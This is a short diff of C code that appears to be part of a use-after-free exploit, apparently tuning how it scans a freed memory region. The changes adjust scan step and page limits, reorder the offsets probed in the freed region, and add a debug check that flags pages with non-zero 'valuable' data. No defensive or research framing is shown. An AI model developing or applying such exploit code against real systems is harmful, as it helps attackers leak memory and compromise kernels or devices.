@@ -42,9 +42,9 @@
 #define UAF_START            0x7001FF000ULL
 #define UAF_SIZE             0x10004000ULL
 #define UAF_SCAN_SIZE        0x04000000ULL
-#define SCAN_PAGE_STEP       1U
-#define SCAN_MAX_PAGES       4096U
-#define SCAN_PROGRESS_EVERY  256U
+#define SCAN_PAGE_STEP       2U
+#define SCAN_MAX_PAGES       2048U
+#define SCAN_PROGRESS_EVERY  128U
 #define OVERLAP_START        0x7001FE000ULL
 #define OVERLAP_SIZE         0x00007000ULL
 #define PLACEH_START         0x710204000ULL
@@ -1672,10 +1672,10 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
     fflush(stderr);
 
     uint64_t uaf_base_offsets[] = {
-        0x0, 0x80, 0x100, 0x180, 0x200, 0x280, 0x300, 0x380,
-        0x400, 0x480, 0x500, 0x580, 0x600, 0x680, 0x700, 0x780,
-        0x800, 0x880, 0x900, 0x980, 0xa00, 0xa80, 0xb00, 0xb80,
-        0xc00, 0xc80, 0xd00, 0xd80, 0xe00, 0xe80, 0xf00, 0xf80};
+        0x0, 0x800, 0x400, 0xc00, 0x200, 0xa00, 0x600, 0xe00,
+        0x100, 0x300, 0x500, 0x700, 0x900, 0xb00, 0xd00, 0xf00,
+        0x080, 0x180, 0x280, 0x380, 0x480, 0x580, 0x680, 0x780,
+        0x880, 0x980, 0xa80, 0xb80, 0xc80, 0xd80, 0xe80, 0xf80};
     int num_offsets = sizeof(uaf_base_offsets) / sizeof(uaf_base_offsets[0]);
     int marker_found = 0;
     int pages_scanned = 0;
@@ -1744,6 +1744,18 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
 
             uint32_t *data = (uint32_t *)dst_vma;
             uint8_t *bytes = (uint8_t *)dst_vma;
+
+            // Debug: check for non-zero data
+            int has_data = 0;
+            for (int i = 0; i < 1024; i++) {
+                if (data[i] != 0) {
+                    has_data = 1;
+                    break;
+                }
+            }
+            if (has_data && pages_scanned % 64 == 0) {
+                fprintf(stderr, "v"); // 'v' for non-zero data (valuable)
+            }
 
             pages_scanned++;
             if (pages_scanned % SCAN_PROGRESS_EVERY == 0)
